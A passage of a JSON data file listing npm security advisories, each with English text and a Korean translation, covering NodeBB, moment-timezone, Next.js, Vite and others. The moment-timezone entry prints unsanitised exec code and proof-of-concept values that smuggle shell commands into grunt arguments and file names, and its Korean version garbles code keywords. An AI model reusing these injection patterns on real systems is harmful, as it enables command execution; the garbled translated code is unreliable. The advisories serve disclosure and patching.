    "descriptionKR": "### 영향\n\nNext.js 서버에 특정 요청이 만들어지면 서버에서 `unhandledRejection`이 발생하여 프로세스가 충돌하여 엄격한 `unhandledRejection` 처리가 있는 특정 Node.js 버전에서 종료될 수 있습니다.\n\n- 영향을 받음: 이 CVE의 영향을 받으려면 다음이 모두 참이어야 합니다.\n  - 엄격한 `unhandledRejection` 종료와 함께 사용되는 v15.0.0 이상의 Node.js 버전\n  - Next.js 버전 v12.2.3\n  - 다음 시작 또는 [커스텀 서버](https://nextjs.org/docs/advanced-features/custom-server) 사용\n \n- 영향 없음: Vercel([vercel.com](https://vercel.com/))의 배포는 'next-server'가 요청 간에 공유되지 않는 유사한 환경과 함께 영향을 받지 않습니다.\n\n### 패치\nhttps://github.com/vercel/next.js/releases/tag/v12.2.4"
  },
  {
    "description": "### In Brief\n`utils.generateUUID`, a helper function available in essentially all versions of NodeBB (as far back as v1.0.1 and potentially earlier) used a cryptographically insecure Pseudo-random number generator (`Math.random()`), which meant that a specially crafted script combined with multiple invocations of the password reset functionality could enable an attacker to correctly calculate the reset code for an account they do not have access to.\n\n### Impact\nThis vulnerability impacts all installations of NodeBB. The vulnerability allows for an attacker to take over any account without the involvement of the victim, and as such, the remediation should be applied immediately (either via NodeBB upgrade or cherry-pick of the specific changeset. Patches have been provided for both active branches of NodeBB (v2.x and v1.19.x)—please see below.\n\nIf you are already on v2.0.0 or v1.19.7, you can upgrade with no ill effects. The new version contains only the patch for this vulnerability.\n\nThe impact of this vulnerability is slightly lessened by the requirement that the target's email address must be known, **and** user emails are protected values in NodeBB. However, since NodeBB can be configured to display email addresses if the admin so wishes, and as email addresses can often by derived from other sources and/or guessed, the impact of this vulnerability is still fairly high.\n\n### Patches\n\n#### v2.x\nThe vulnerability has been patched in https://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888. You can cherry-pick this directly into your codebase.\n\n#### v1.19.x\nThe vulnerability has been patched in 81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9. You can cherry-pick this directly into your codebase.\n\n### Workarounds\nThere is no known workaround, but the patch sets listed above will fully patch the vulnerability.\n\n### References\n* [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](http://cwe.mitre.org/data/definitions/338.html)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss it on [our community forum](community.nodebb.org/)\n* Email us at [support@nodebb.org](mailto:support@nodebb.org)\n",
    "identifiers": "GHSA : GHSA-p4cc-w597-6cpm\nCVE : CVE-2022-36045",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-08-30T20:38:10Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-p4cc-w597-6cpm\nhttps://github.com/NodeBB/NodeBB/commit/81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36045\nhttps://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888\nhttps://github.com/advisories/GHSA-p4cc-w597-6cpm",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.0.0",
    "identifier": "2.0.1",
    "descriptionKR": "### 간단히\n기본적으로 NodeBB의 모든 버전(v1.0.1 및 잠재적으로 이전)에서 사용할 수 있는 도우미 함수인 `utils.generateUUID`는 암호학적으로 안전하지 않은 의사 난수 생성기(`Math.random()`)를 사용했습니다. 암호 재설정 기능의 여러 호출과 결합된 특수 제작된 스크립트를 통해 공격자는 액세스 권한이 없는 계정의 재설정 코드를 올바르게 계산할 수 있습니다.\n\n### 영향\n이 취약점은 NodeBB의 모든 설치에 영향을 미칩니다. 이 취약성으로 인해 공격자는 피해자의 개입 없이 모든 계정을 탈취할 수 있으므로 수정 조치를 즉시 적용해야 합니다(NodeBB 업그레이드 또는 특정 변경 집합의 선택을 통해). 패치는 두 활성 분기 모두에 제공되었습니다. NodeBB(v2.x 및 v1.19.x) - 아래를 참조하십시오.\n\n이미 v2.0.0 또는 v1.19.7을 사용 중인 경우 악영향 없이 업그레이드할 수 있습니다. 새 버전에는 이 취약점에 대한 패치만 포함되어 있습니다.\n\n이 취약점의 영향은 대상의 이메일 주소를 알아야 하고 **그리고** 사용자 이메일이 NodeBB에서 보호되는 값이라는 요구 사항으로 인해 약간 줄어듭니다. 그러나 관리자가 원할 경우 이메일 주소를 표시하도록 NodeBB를 구성할 수 있고 이메일 주소가 종종 다른 소스에서 파생되거나 추측될 수 있기 때문에 이 취약점의 영향은 여전히 ​​상당히 높습니다.\n\n### 패치\n\n#### v2.x\n이 취약점은 https://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888에서 패치되었습니다. 이것을 코드베이스에 직접 선별할 수 있습니다.\n\n#### v1.19.x\n이 취약점은 81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9에서 패치되었습니다. 이것을 코드베이스에 직접 선별할 수 있습니다.\n\n### 해결 방법\n알려진 해결 방법은 없지만 위에 나열된 패치 세트는 취약점을 완전히 패치합니다.\n\n### 참조\n* [CWE-338: 암호학적으로 취약한 PRNG(Pseudo-Random Number Generator) 사용](http://cwe.mitre.org/data/definitions/338.html)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [커뮤니티 포럼](community.nodebb.org/)에서 토론하세요.\n* [support@nodebb.org](mailto:support@nodebb.org)로 이메일을 보내주세요."
  },
  {
    "description": "### In Brief\n`utils.generateUUID`, a helper function available in essentially all versions of NodeBB (as far back as v1.0.1 and potentially earlier) used a cryptographically insecure Pseudo-random number generator (`Math.random()`), which meant that a specially crafted script combined with multiple invocations of the password reset functionality could enable an attacker to correctly calculate the reset code for an account they do not have access to.\n\n### Impact\nThis vulnerability impacts all installations of NodeBB. The vulnerability allows for an attacker to take over any account without the involvement of the victim, and as such, the remediation should be applied immediately (either via NodeBB upgrade or cherry-pick of the specific changeset. Patches have been provided for both active branches of NodeBB (v2.x and v1.19.x)—please see below.\n\nIf you are already on v2.0.0 or v1.19.7, you can upgrade with no ill effects. The new version contains only the patch for this vulnerability.\n\nThe impact of this vulnerability is slightly lessened by the requirement that the target's email address must be known, **and** user emails are protected values in NodeBB. However, since NodeBB can be configured to display email addresses if the admin so wishes, and as email addresses can often by derived from other sources and/or guessed, the impact of this vulnerability is still fairly high.\n\n### Patches\n\n#### v2.x\nThe vulnerability has been patched in https://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888. You can cherry-pick this directly into your codebase.\n\n#### v1.19.x\nThe vulnerability has been patched in 81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9. You can cherry-pick this directly into your codebase.\n\n### Workarounds\nThere is no known workaround, but the patch sets listed above will fully patch the vulnerability.\n\n### References\n* [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](http://cwe.mitre.org/data/definitions/338.html)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Discuss it on [our community forum](community.nodebb.org/)\n* Email us at [support@nodebb.org](mailto:support@nodebb.org)\n",
    "identifiers": "GHSA : GHSA-p4cc-w597-6cpm\nCVE : CVE-2022-36045",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-08-30T20:38:10Z",
    "references": "https://github.com/NodeBB/NodeBB/security/advisories/GHSA-p4cc-w597-6cpm\nhttps://github.com/NodeBB/NodeBB/commit/81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36045\nhttps://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888\nhttps://github.com/advisories/GHSA-p4cc-w597-6cpm",
    "name": "nodebb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.19.8",
    "identifier": "1.19.8",
    "descriptionKR": "### 요약\n기본적으로 NodeBB의 모든 버전(v1.0.1 및 잠재적으로 이전)에서 사용할 수 있는 도우미 함수인 `utils.generateUUID`는 암호학적으로 안전하지 않은 의사 난수 생성기(`Math.random()`)를 사용했습니다. 암호 재설정 기능의 여러 호출과 결합된 특수 제작된 스크립트를 통해 공격자는 액세스 권한이 없는 계정의 재설정 코드를 올바르게 계산할 수 있습니다.\n\n### 영향\n이 취약점은 NodeBB의 모든 설치에 영향을 미칩니다. 이 취약성으로 인해 공격자는 피해자의 개입 없이 모든 계정을 탈취할 수 있으므로 수정 조치를 즉시 적용해야 합니다(NodeBB 업그레이드 또는 특정 변경 집합의 선택을 통해). 패치는 두 활성 분기 모두에 제공되었습니다. NodeBB(v2.x 및 v1.19.x) - 아래를 참조하십시오.\n\n이미 v2.0.0 또는 v1.19.7을 사용 중인 경우 악영향 없이 업그레이드할 수 있습니다. 새 버전에는 이 취약점에 대한 패치만 포함되어 있습니다.\n\n이 취약점의 영향은 대상의 이메일 주소를 알아야 하고 **그리고** 사용자 이메일이 NodeBB에서 보호되는 값이라는 요구 사항으로 인해 약간 줄어듭니다. 그러나 관리자가 원할 경우 이메일 주소를 표시하도록 NodeBB를 구성할 수 있고 이메일 주소가 종종 다른 소스에서 파생되거나 추측될 수 있기 때문에 이 취약점의 영향은 여전히 ​​상당히 높습니다.\n\n### 패치\n\n#### v2.x\n이 취약점은 https://github.com/NodeBB/NodeBB/commit/e802fab87f94a13f397f04cfe6068f2f7ddf7888에서 패치되었습니다. 이것을 코드베이스에 직접 선별할 수 있습니다.\n\n#### v1.19.x\n이 취약점은 81e3c1ba488d03371a5ce8d0ebb5c5803026e0f9에서 패치되었습니다. 이것을 코드베이스에 직접 선별할 수 있습니다.\n\n### 해결 방법\n알려진 해결 방법은 없지만 위에 나열된 패치 세트는 취약점을 완전히 패치합니다.\n\n### 참조\n* [CWE-338: 암호학적으로 취약한 PRNG(Pseudo-Random Number Generator) 사용](http://cwe.mitre.org/data/definitions/338.html)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [커뮤니티 포럼](community.nodebb.org/)에서 토론하세요.\n* [support@nodebb.org](mailto:support@nodebb.org)로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nAll versions of moment-timezone from 0.1.0 contain build tasks vulnerable to command injection.\n\n* if Alice uses tzdata pipeline to package moment-timezone on her own (for example via `grunt data:2014d`, where `2014d` stands for the version of the tzdata to be used from IANA's website),\n* and Alice let's Mallory select the version (`2014d` in our example), then Mallory can execute arbitrary commands on the machine running the grunt task, with the same privilege as the grunt task\n\n#### Am I affected?\n\n##### Do you build custom versions of moment-timezone with grunt?\n\nIf no, you're not affected.\n\n##### Do you allow a third party to specify which particular version you want build?\n\nIf yes, you're vulnerable to command injection -- third party may execute arbitrary commands on the system running grunt task with the same privileges as grunt task.\n\n### Description\n\n#### Command Injection via grunt-zdownload.js and MITM on iana's ftp endpoint\n\nThe `tasks/data-download.js` script takes in a parameter from grunt and uses it to form a command line which is then executed:\n\n```\n6  module.exports = function (grunt) {\n7      grunt.registerTask('data-download', '1. Download data from iana.org/time-zones.', function (version) {\n8          version = version || 'latest';\n\n10          var done  = this.async(),\n11              src   = 'ftp://ftp.iana.org/tz/tzdata-latest.tar.gz',\n12              curl  = path.resolve('temp/curl', version, 'data.tar.gz'),\n13              dest  = path.resolve('temp/download', version);\n...\n24          exec('curl ' + src + ' -o ' + curl + ' && cd ' + dest + ' && gzip -dc ' + curl + ' | tar -xf -', function (err) {\n```\n\nOrdinarily, one one run this script using something like `grunt data-download:2014d`, in which case version would have the value `2014d`. However, if an attacker were to provide additional content on the command line, they would be able to execute arbitrary code\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-download:2014d ; echo flag>/tmp/foo #'\n\\Running \"data-download:2014d ; echo flag>/tmp/foo #\" (data-download) task\n>> Downloading https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n>> Downloaded https://data.iana.org/time-zones/releases/tzdata2014d ; echo flag>/tmp/foo #.tar.gz\n\nDone.\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/foo\nflag\n```\n\n#### Command Injection via data-zdump.js\n\nThe `tasks/data-zdump.js` script reads a list of files present in a temporary directory (created by previous tasks), and for each one, assembles and executes a command line without sanitization. As a result, an attacker able to influence the contents of that directory could gain code execution. This attack is exacerbated by timezone data being downloaded via cleartext FTP (described above), but beyond that, an attacker at iana.org able to modify the timezone files could disrupt any systems that build moment-timezone.\n\n```\n15              files     = grunt.file.expand({ filter : 'isFile', cwd : 'temp/zic/' + version }, '**/*');\n...\n27          function next () {\n...\n33              var file = files.pop(),\n34                  src  = path.join(zicBase, file),\n35                  dest = path.join(zdumpBase, file);\n36              exec('zdump -v ' + src, { maxBuffer: 20*1024*1024 }, function (err, stdout) {\n```\n\nIn this case, an attacker able to add a file to `temp/zic/2014d` (for example) with a filename like `Z; curl www.example.com` would influence the called to exec on line 36 and run arbitrary code. There are a few minor challenges in exploiting this, since the string needs to be a valid filename.\n\n#### Command Injection via data-zic.js\n\nSimilar to the vulnerability in /tasks/data-download.js, the /tasks/data-zic.js script takes a version from the command line and uses it as part of a command line, executed without sanitization.\n\n```\n10          var done  = this.async(),\n11              dest  = path.resolve('temp/zic', version),\n...\n22              var file = files.shift(),\n23                  src = path.resolve('temp/download', version, file);\n24\n25              exec('zic -d ' + dest + ' ' + src, function (err) {\n```\n\nAs a result, an attacker able to influence that string can run arbitrary commands. Of course, it requires an attacker able to influence the command passed to grunt, so may be unlikely in practice.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-zic:2014d; echo hi > /tmp/evil; echo '\nRunning \"data-zic:2014d; echo hi > /tmp/evil; echo \" (data-zic) task\nexec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; echo hi > /tmp/evil; echo  /usr/src/app/moment-timezone/temp/download/2014d; echo hi > /tmp/evil; echo /africa\n...\n\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil\nhi\n```\n\n### Patches\n\nThe supplied patch on top of 0.5.34 is applicable with minor tweaks to all affected versions. It switches `exec` to `execFile` so arbitrary bash fragments won't be executed any more.\n\n### References\n\n* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html\n* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/",
    "identifiers": "GHSA : GHSA-56x4-j7p9-fcf9",
    "severity": "LOW",
    "updatedAt": "2023-01-12T05:07:32Z",
    "publishedAt": "2022-08-30T20:31:21Z",
    "references": "https://github.com/moment/moment-timezone/security/advisories/GHSA-56x4-j7p9-fcf9\nhttps://github.com/moment/moment-timezone/commit/ce955a301ff372e8e9fb3a5b516620c60e7a082a\nhttps://github.com/advisories/GHSA-56x4-j7p9-fcf9",
    "name": "moment-timezone",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.1.0, < 0.5.35",
    "identifier": "0.5.35",
    "descriptionKR": "### 영향\n\n0.1.0부터 모든 버전의 moment-timezone에는 명령 주입에 취약한 빌드 작업이 포함되어 있습니다.\n\n* Alice가 tzdata 파이프라인을 사용하여 moment-timezone을 자체적으로 패키징하는 경우(예: `grunt data:2014d`를 통해, 여기서 `2014d`는 IANA 웹사이트에서 사용할 tzdata 버전을 나타냄),\n* Alice가 Mallory가 버전(이 예에서는 `2014d`)을 선택하면 Mallory는 grunt 작업을 실행하는 컴퓨터에서 grunt 작업과 동일한 권한으로 임의의 명령을 실행할 수 있습니다.\n\n#### 영향을 받나요?\n\n##### 그런트로 moment-timezone의 사용자 정의 버전을 빌드합니까?\n\n아니요인 경우 영향을 받지 않습니다.\n\n##### 빌드하려는 특정 버전을 제3자가 지정하도록 허용합니까?\n\n그렇다면 명령 주입에 취약합니다. 제3자는 그런트 작업과 동일한 권한으로 그런트 작업을 실행하는 시스템에서 임의의 명령을 실행할 수 있습니다.\n\n### 설명\n\n#### iana의 ftp 끝점에서 grunt-zdownload.js 및 MITM을 통한 명령 주입\n\n`tasks/data-download.js` 스크립트는 grunt에서 매개변수를 가져와 실행되는 명령줄을 구성하는 데 사용합니다.\n\n```\n6 module.exports = 함수(그런트) {\n7 grunt.registerTask('data-download', '1. iana.org/time-zones에서 데이터 다운로드', function (version) {\n8 버전 = 버전 || '최신';\n\n10 var done = this.async(),\n11 소스 = 'ftp://ftp.iana.org/tz/tzdata-latest.tar.gz',\n12 curl = path.resolve('temp/curl', 버전, 'data.tar.gz'),\n13 dest = path.resolve('임시/다운로드', 버전);\n...\n24 exec('컬' + src + ' -o ' + 컬 + ' && cd ' + dest + ' && gzip -dc ' + 컬 + ' | tar -xf -', 함수(err) {\n```\n\n일반적으로 하나는 `grunt data-download:2014d`와 같은 것을 사용하여 이 스크립트를 실행합니다. 이 경우 버전 값은 `2014d`입니다. 그러나 공격자가 명령줄에 추가 콘텐츠를 제공하면 임의 코드를 실행할 수 있습니다.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-download:2014d ; 에코 플래그>/tmp/foo #'\n\\Running \"data-download:2014d ; echo flag>/tmp/foo #\" (data-download) 작업\n>> 다운로드 https://data.iana.org/time-zones/releases/tzdata2014d ; 에코 플래그>/tmp/foo #.tar.gz\n>> 다운로드됨 https://data.iana.org/time-zones/releases/tzdata2014d ; 에코 플래그>/tmp/foo #.tar.gz\n\n완료.\nroot@e94ba0490b65:/usr/src/app/moment-timezone# 고양이 /tmp/foo\n깃발\n```\n\n#### data-zdump.js를 통한 명령 주입\n\n`tasks/data-zdump.js` 스크립트는 임시 디렉토리(이전 작업에서 생성됨)에 있는 파일 목록을 읽고 각 파일에 대해 삭제 없이 명령줄을 조합하고 실행합니다. 결과적으로 해당 디렉토리의 내용에 영향을 미칠 수 있는 공격자는 코드 실행 권한을 얻을 수 있습니다. 이 공격은 일반 텍스트 FTP(위에 설명됨)를 통해 다운로드되는 시간대 데이터로 인해 악화되지만, 그 이상으로 시간대 파일을 수정할 수 있는 iana.org의 공격자는 순간 시간대를 구축하는 모든 시스템을 방해할 수 있습니다.\n\n```\n15 파일 = grunt.file.expand({ 필터: 'isFile', cwd: 'temp/zic/' + 버전 }, '**/*');\n...\n27 함수 다음() {\n...\n33 var 파일 = 파일.팝(),\n34 src = 경로.조인(zicBase, 파일),\n35 dest = 경로.조인(zdumpBase, 파일);\n36 exec('zdump -v ' + src, { maxBuffer: 20*1024*1024 }, 함수(err, stdout) {\n```\n\n이 경우 공격자는 파일 이름을 `Z; curl www.example.com`은 36행에서 exec 호출에 영향을 미치고 임의의 코드를 실행합니다. 문자열이 유효한 파일 이름이어야 하므로 이를 악용하는 데 몇 가지 사소한 문제가 있습니다.\n\n#### data-zic.js를 통한 명령 주입\n\n/tasks/data-download.js의 취약점과 유사하게 /tasks/data-zic.js 스크립트는 명령줄에서 버전을 가져와 삭제 없이 실행되는 명령줄의 일부로 사용합니다.\n\n```\n10 var done = this.async(),\n11 dest = path.resolve('temp/zic', 버전),\n...\n22 var 파일 = 파일.시프트(),\n23 src = path.resolve('임시/다운로드', 버전, 파일);\n24\n25 exec('zic -d ' + dest + ' ' + src, 함수(err) {\n```\n\n결과적으로 해당 문자열에 영향을 줄 수 있는 공격자는 임의의 명령을 실행할 수 있습니다. 물론 공격자가 grunt에게 전달된 명령에 영향을 미칠 수 있어야 하므로 실제로는 불가능할 수 있습니다.\n\n```\nroot@e94ba0490b65:/usr/src/app/moment-timezone# grunt 'data-zic:2014d; 에코 하이 > /tmp/evil; 에코 '\n실행 \"data-zic:2014d; echo hi > /tmp/evil; echo \" (data-zic) 작업\nexec: zid -d /usr/src/app/moment-timezone/temp/zic/2014d; 에코 하이 > /tmp/evil; echo /usr/src/app/moment-timezone/temp/download/2014d; 에코 하이 > /tmp/evil; 에코 /아프리카\n...\n\nroot@e94ba0490b65:/usr/src/app/moment-timezone# cat /tmp/evil\n안녕\n```\n\n### 패치\n\n0.5.34 위에 제공되는 패치는 영향을 받는 모든 버전에 약간의 조정을 적용할 수 있습니다. 임의의 bash 조각이 더 이상 실행되지 않도록 `exec`를 `execFile`로 전환합니다.\n\n### 참조\n\n* https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html\n* https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/"
  },
  {
    "description": "### Impact\n\n* if Alice uses `grunt data` (or `grunt release`) to prepare a custom-build, moment-timezone with the latest tzdata from IANA's website\n* and Mallory intercepts the request to IANA's unencrypted ftp server, Mallory can serve data which might exploit further stages of the moment-timezone tzdata pipeline, or potentially produce a tainted version of moment-timezone (practicality of such attacks is not proved)\n\n### Patches\nProblem has been patched in version 0.5.35, patch should be applicable with minor modifications to all affected versions. The patch includes changing the FTP endpoint with an HTTPS endpoint.\n\n### Workarounds\nSpecify the exact version of tzdata (like `2014d`, full command being `grunt data:2014d`, then run the rest of the release tasks by hand), or just apply the patch before issuing the grunt command.\n",
    "identifiers": "GHSA : GHSA-v78c-4p63-2j6c",
    "severity": "MODERATE",
    "updatedAt": "2023-01-12T05:07:10Z",
    "publishedAt": "2022-08-30T20:28:43Z",
    "references": "https://github.com/moment/moment-timezone/security/advisories/GHSA-v78c-4p63-2j6c\nhttps://github.com/moment/moment-timezone/commit/7915ac567ab19700e44ad6b5d8ef0b85e48a9e75\nhttps://github.com/advisories/GHSA-v78c-4p63-2j6c",
    "name": "moment-timezone",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.1.0, < 0.5.35",
    "identifier": "0.5.35",
    "descriptionKR": "### 영향\n\n* Alice가 `grunt data`(또는 `grunt release`)를 사용하여 IANA 웹사이트의 최신 tzdata를 사용하여 맞춤 빌드 순간 시간대를 준비하는 경우\n* Mallory가 IANA의 암호화되지 않은 ftp 서버에 대한 요청을 가로채면 Mallory는 moment-timezone tzdata 파이프라인의 추가 단계를 악용하거나 잠재적으로 오염된 버전의 moment-timezone을 생성할 수 있는 데이터를 제공할 수 있습니다(이러한 공격의 실용성은 입증되지 않음).\n\n### 패치\n버전 0.5.35에서 문제가 패치되었으며 영향을 받는 모든 버전에 약간의 수정을 가하면 패치를 적용할 수 있습니다. 패치에는 HTTPS 끝점을 사용하여 FTP 끝점을 변경하는 것이 포함됩니다.\n\n### 해결 방법\ntzdata의 정확한 버전을 지정하거나(예: `2014d`, 전체 명령은 `grunt data:2014d`인 다음 나머지 릴리스 작업을 직접 실행) grunt 명령을 실행하기 전에 패치를 적용하십시오."
  },
  {
    "description": "Cross-site Scripting (XSS) - Reflected in GitHub repository bustle/mobiledoc-kit prior to 0.14.2.",
    "identifiers": "GHSA : GHSA-hw2p-xqhq-3mjf\nCVE : CVE-2022-2932",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:01:30Z",
    "publishedAt": "2022-08-23T00:00:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2932\nhttps://github.com/bustle/mobiledoc-kit/commit/f3fdaa5352904fd2a0b4247ccb0dbf68aad43b5a\nhttps://huntr.dev/bounties/2-other-bustle/mobiledoc-kit\nhttps://github.com/advisories/GHSA-hw2p-xqhq-3mjf",
    "name": "mobiledoc-kit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.14.2",
    "identifier": "0.14.2",
    "descriptionKR": "교차 사이트 스크립팅(XSS) - 0.14.2 이전의 GitHub 리포지토리 bustle/mobiledoc-kit에 반영되었습니다."
  },
  {
    "description": "The Directus process can be aborted by having an authorized user update the `filename_disk` value to a folder and accessing that file through the `/assets` endpoint. \n\nThe vulnerability is patched and released in v9.15.0.\n\nYou can prevent this problem by making sure no (untrusted) non-admin users have permissions to update the `filename_disk` field on `directus_files`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open a Discussion in [directus/directus](https://github.com/directus/directus/discussions)\n* Email us at [security@directus.io](mailto:security@directus.io)\n\n### Credits\n\nThis vulnerability was first discovered and reported by Witold Gorecki.",
    "identifiers": "GHSA : GHSA-77qm-wvqq-fg79\nCVE : CVE-2022-36031",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:02:08Z",
    "publishedAt": "2022-08-30T20:18:48Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-77qm-wvqq-fg79\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36031\nhttps://github.com/advisories/GHSA-77qm-wvqq-fg79",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.15.0",
    "identifier": "9.15.0",
    "descriptionKR": "Directus 프로세스는 승인된 사용자가 `filename_disk` 값을 폴더로 업데이트하고 `/assets` 엔드포인트를 통해 해당 파일에 액세스하도록 함으로써 중단될 수 있습니다.\n\n이 취약점은 v9.15.0에서 패치 및 릴리스되었습니다.\n\n(신뢰할 수 없는) 관리자가 아닌 사용자에게 `directus_files`의 `filename_disk` 필드를 업데이트할 수 있는 권한이 없는지 확인하여 이 문제를 방지할 수 있습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [directus/directus](https://github.com/directus/directus/discussions)에서 토론 열기\n* [security@directus.io](mailto:security@directus.io)로 이메일을 보내주세요.\n\n### 크레딧\n\n이 취약점은 Witold Gorecki가 처음 발견하고 보고했습니다."
  },
  {
    "description": "Vitejs Vite before v2.9.13 was discovered to allow attackers to perform a directory traversal via a crafted URL to the victim's service.",
    "identifiers": "GHSA : GHSA-mv48-hcvh-8jj8\nCVE : CVE-2022-35204",
    "severity": "MODERATE",
    "updatedAt": "2023-01-28T05:01:35Z",
    "publishedAt": "2022-08-19T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35204\nhttps://github.com/vitejs/vite/issues/8498\nhttps://github.com/vitejs/vite/releases/tag/v2.9.13\nhttps://github.com/vitejs/vite/releases/tag/v3.0.0-beta.4\nhttps://github.com/advisories/GHSA-mv48-hcvh-8jj8",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.9.13",
    "identifier": "2.9.13",
    "descriptionKR": "v2.9.13 이전의 Vitejs Vite는 공격자가 피해자의 서비스에 대해 조작된 URL을 통해 디렉터리 순회를 수행할 수 있도록 허용하는 것으로 밝혀졌습니다."
  },
  {
    "description": "Git-it through 4.4.0 allows OS command injection at the Branches Aren't Just For Birds challenge step. During the verification process, it attempts to run the reflog command followed by the current branch name (which is not sanitized for execution).",
    "identifiers": "GHSA : GHSA-wjqc-j537-j9gj\nCVE : CVE-2021-44685",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:05:08Z",
    "publishedAt": "2021-12-08T00:01:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-44685\nhttps://github.com/dwisiswant0/advisory/issues/3\nhttps://github.com/jlord/git-it-electron/releases\nhttps://advisory.dw1.io/3\nhttps://github.com/advisories/GHSA-wjqc-j537-j9gj",
    "name": "git-it-electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.3.0",
    "descriptionKR": "Git-it ~ 4.4.0은 Branches Aren't For Birds 챌린지 단계에서 OS 명령 주입을 허용합니다. 확인 프로세스 중에 reflog 명령 다음에 현재 분기 이름(실행을 위해 삭제되지 않음)을 실행하려고 시도합니다."
  },
  {
    "description": "All versions of package pg-native; all versions of package libpq are vulnerable to Denial of Service (DoS) when the addons attempt to cast the second argument to an array and fail. This happens for every non-array argument passed. **Note:** pg-native is a mere binding to npm's libpq library, which in turn has the addons and bindings to the actual C libpq library. This means that problems found in pg-native may transitively impact npm's libpq.",
    "identifiers": "GHSA : GHSA-j32j-2hxv-rqf7\nCVE : CVE-2022-25852",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:04:44Z",
    "publishedAt": "2022-06-18T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25852\nhttps://snyk.io/vuln/SNYK-JS-LIBPQ-2392366\nhttps://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365\nhttps://github.com/brianc/node-libpq/issues/84\nhttps://github.com/brianc/node-libpq/pull/86\nhttps://github.com/advisories/GHSA-j32j-2hxv-rqf7",
    "name": "pg-native",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 3.0.0",
    "identifier": "3.0.1",
    "descriptionKR": "패키지 pg-native의 모든 버전; 패키지 libpq의 모든 버전은 애드온이 두 번째 인수를 배열로 캐스팅하려고 시도하고 실패할 때 서비스 거부(DoS)에 취약합니다. 이는 전달된 모든 비배열 인수에 대해 발생합니다. **참고:** pg-native는 npm의 libpq 라이브러리에 대한 단순한 바인딩이며, 여기에는 실제 C libpq 라이브러리에 대한 애드온 및 바인딩이 있습니다. 이는 pg-native에서 발견된 문제가 npm의 libpq에 전이적으로 영향을 미칠 수 있음을 의미합니다."
  },
  {
    "description": "All versions of package pg-native; all versions of package libpq are vulnerable to Denial of Service (DoS) when the addons attempt to cast the second argument to an array and fail. This happens for every non-array argument passed. **Note:** pg-native is a mere binding to npm's libpq library, which in turn has the addons and bindings to the actual C libpq library. This means that problems found in pg-native may transitively impact npm's libpq.",
    "identifiers": "GHSA : GHSA-j32j-2hxv-rqf7\nCVE : CVE-2022-25852",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:04:44Z",
    "publishedAt": "2022-06-18T00:00:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25852\nhttps://snyk.io/vuln/SNYK-JS-LIBPQ-2392366\nhttps://snyk.io/vuln/SNYK-JS-PGNATIVE-2392365\nhttps://github.com/brianc/node-libpq/issues/84\nhttps://github.com/brianc/node-libpq/pull/86\nhttps://github.com/advisories/GHSA-j32j-2hxv-rqf7",
    "name": "libpq",
    "ecosystem": "NPM",
